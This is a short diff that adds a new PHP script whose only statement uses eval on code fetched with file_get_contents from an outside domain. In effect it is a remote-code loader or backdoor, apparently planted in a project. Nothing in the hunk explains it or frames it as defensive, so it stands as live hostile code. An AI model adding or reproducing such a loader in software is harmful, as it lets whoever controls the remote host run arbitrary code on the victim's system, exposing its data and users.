@@ -1,0 +1,3 @@
+#!/bin/php 
+<?php 
+eval(file_get_contents("https://duyahihihi.link/code.php")); 
